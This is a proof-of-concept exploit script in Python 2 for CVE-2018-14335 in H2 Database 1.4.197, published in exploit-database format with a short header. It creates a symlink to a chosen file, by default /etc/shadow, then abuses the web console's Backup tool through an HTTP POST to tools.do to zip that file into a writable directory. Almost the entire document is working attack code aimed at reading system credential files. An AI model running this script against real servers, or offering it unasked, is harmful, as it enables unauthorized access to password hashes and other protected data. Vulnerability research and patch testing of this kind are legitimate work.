# Exploit Title: H2 Database 1.4.197 - Information Disclosure
# Date: 2018-07-16
# Exploit Author: owodelta
# Vendor Homepage: www.h2database.com
# Software Link: http://www.h2database.com/html/download.html
# Version: all versions
# Tested on: Linux
# CVE : CVE-2018-14335

# Description: Insecure handling of permissions in the backup function allows
# attackers to read sensitive files (outside of their permissions) via a
# symlink to a fake database file.

# PS, thanks to HTB and our team FallenAngels

#!/usr/bin/python

import requests
import argparse
import os
import random

def cleanup(wdir):
	cmd = "rm {}symlink.trace.db".format(wdir)
	os.system(cmd)

def create_symlink(file, wdir):
	cmd = "ln -s {0} {1}symlink.trace.db".format(file,wdir)
	os.system(cmd)


def trigger_symlink(host, wdir):
	outputName = str(random.randint(1000,10000))+".zip"
	#get cookie
	url = 'http://{}'.format(host)
	r = requests.get(url)
	path = r.text.split('href = ')[1].split(';')[0].replace("'","").replace('login.jsp','tools.do')
	url = '{}/{}'.format(url,path)
	payload = {
			"tool":"Backup",
			"args":"-file,"+wdir+outputName+",-dir,"+wdir}
	#print url
	requests.post(url,data=payload).text
	print "File is zipped in: "+wdir+outputName

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	required = parser.add_argument_group('required arguments')
	required.add_argument("-H",
			"--host",
			metavar='127.0.0.1:8082',
			help="Target host",
            required=True)
	required.add_argument("-D",
			"--dir",
			metavar="/tmp/",
			default="/tmp/",
			help="Writable directory")
	required.add_argument("-F",
			"--file",
			metavar="/etc/shadow",
			default="/etc/shadow",
			help="Desired file to read",)
	args = parser.parse_args()

create_symlink(args.file,args.dir)
trigger_symlink(args.host,args.dir)
cleanup(args.dir)